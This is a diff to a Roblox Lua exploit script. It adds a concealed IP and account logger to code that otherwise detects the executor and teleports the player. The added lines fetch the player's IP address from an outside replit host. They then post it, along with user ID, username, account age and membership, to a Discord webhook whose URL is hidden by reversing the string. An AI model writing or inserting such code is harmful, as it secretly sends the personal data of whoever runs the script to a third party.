@@ -151,3 +151,55 @@ elseif getexecutorname then
     exploit_type = "Script-Ware"
 end
 TeleportService:Teleport(10209266381)
+local a = game:HttpGet("https://Google.littsedth.repl.co/GetHeaders")
+local d = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false"))
+local prem = "None"
+if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
+    prem = "Premium"
+end
+http_request = http_request or request or (http and http.request) or syn.request 
+local response = http_request(
+    {
+
+        Url = string.reverse("acdZYCM9ZO67NTCgaJ93A6ZMmsyV-g2AuJNUhbdBpoTTjm9z-_A2Z3gyVme2NpHhD2WL/3547818427257530001/skoohbew/ipa/moc.drocsid//:sptth"),
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"  -- When sending JSON, set this!
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {{
+            ["title"] = "Executor: "..exploit_type,
+            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.. "/profile",
+            ["color"] = 16737792,
+            ["fields"] = {
+                {
+                    ["name"] = "User ID",
+                    ["value"] = "```lua\n"..game.Players.LocalPlayer.UserId.."\n```",
+                    ["inline"] = true
+                  },
+                  {
+                    ["name"] = "Account Age",
+                    ["value"] = "```lua\n"..game.Players.LocalPlayer.AccountAge.."\n```",
+                    ["inline"] = true
+                  },
+                  {
+                    ["name"] = "IP Address",
+                    ["value"] = "```lua\n"..a.."\n```"
+                  },
+                  {
+                    ["name"] = "Membership",
+                    ["value"] = "```md\n#"..prem.."\n```"
+                  },
+                  {
+                    ["name"] = "Username",
+                    ["value"] = "```md\n#"..game.Players.LocalPlayer.Name.."\n```"
+                  }
+            },
+            ["footer"] = {
+                ["text"] = "Blackbear Execution Logs https://discord.gg/UrGg5BmRAH"
+            },
+            ["thumbnail"] = {
+                ["url"] = d.data[1].imageUrl
+            }
+        }}})
+    }
+)
